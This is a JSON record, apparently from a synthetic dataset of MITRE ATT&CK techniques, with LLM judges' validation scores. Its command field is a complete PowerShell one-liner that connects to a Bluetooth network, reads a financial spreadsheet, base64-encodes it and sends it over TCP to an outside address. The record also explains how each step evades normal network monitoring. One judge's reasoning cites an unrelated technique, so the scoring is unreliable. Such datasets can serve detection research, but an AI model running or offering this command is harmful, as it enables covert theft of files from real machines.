{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.2 255.255.255.252 | Out-Null; $data=[IO.File]::ReadAllBytes('C:\\Users\\Public\\fin.xlsx'); $b64=[Convert]::ToBase64String($data); $tcp=New-Object Net.Sockets.TcpClient; $tcp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.2'),0)); $tcp.Connect('172.25.83.1',52319); $ns=$tcp.GetStream(); $buf=[Text.Encoding]::UTF8.GetBytes($b64); $ns.Write($buf,0,$buf.Length); $ns.Close(); $tcp.Close()",
  "explanation": "Pairs/connects to a Bluetooth NAP, configures the Bluetooth PAN interface, and exfiltrates a file as base64 over a custom TCP port bound to the Bluetooth IP, aligning with T1011 (alternate network medium).",
  "rationale_steps": [
    "Establish Bluetooth PAN via BluetoothCL to use a non-primary medium (Bluetooth).",
    "Assign a static IP on the Bluetooth adapter with netsh to isolate traffic.",
    "Base64-encode data to blend content while keeping commands unobfuscated.",
    "Bind TCP client to the Bluetooth IP to force egress over Bluetooth and send to a high, uncommon port."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-3407e080",
  "source_prompt_hash": "f4a0ca3c",
  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "PowerShell command is well-formed with balanced quoting/parentheses, valid separators, and parseable .NET and netsh invocations.",
        "semantic_score": 3,
        "semantic_justification": "The flow plausibly targets Bluetooth PAN for exfiltration (aligning with T1011), but it likely requires admin rights for netsh IP configuration and assumes BluetoothCL.exe supports '/connect ... NAP', making successful execution uncertain.",
        "combined_score": 4.0,
        "confidence": 0.6,
        "timestamp": "2025-10-01T22:02:43.948603Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignments, pipeline operations, and method calls.",
        "semantic_score": 5,
        "semantic_justification": "The command fully aligns with T1011 by establishing an alternate communication channel via Bluetooth PAN, configuring the network interface, and exfiltrating data over this non-traditional network medium.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T04:05:23.104836Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced elements, and valid method calls and operators throughout.",
        "semantic_score": 1,
        "semantic_justification": "The command fundamentally misaligns with T1011 by not employing 'system script proxy execution' but rather direct execution, and its 'netsh' component requires elevated privileges, contradicting the stated 'None' privilege level.",
        "combined_score": 3.0,
        "confidence": 1,
        "timestamp": "2025-10-02T04:05:39.839048Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.0,
    "llm_average_score": 4.0,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}